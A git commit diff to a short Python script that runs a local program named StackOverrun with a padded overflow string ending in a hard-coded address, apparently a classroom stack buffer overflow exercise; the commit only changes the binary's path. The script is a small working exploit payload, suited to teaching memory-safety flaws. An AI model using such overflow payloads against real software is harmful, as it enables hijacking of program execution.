d0561be41574c952c11d499e956ecc6d6b9286e5
Dustin Ray <dustiv2@uw.edu>
2021-07-10 19:03:11 -0700

    update

--- src/python/BufferOverflowScript.py
+++ src/python/BufferOverflowScript.py
@@ -3,7 +3,7 @@ from subprocess import call
 def main():
 
     addressOfBar = "\x43\x62\x55\x56"
-    call(["./StackOverrun", "AAAAAAAAAAAAAAAAAAAAAA\x43\x62\x55\x56"])
+    call(["src/bin/StackOverrun", "AAAAAAAAAAAAAAAAAAAAAA\x43\x62\x55\x56"])
 
    
 main()
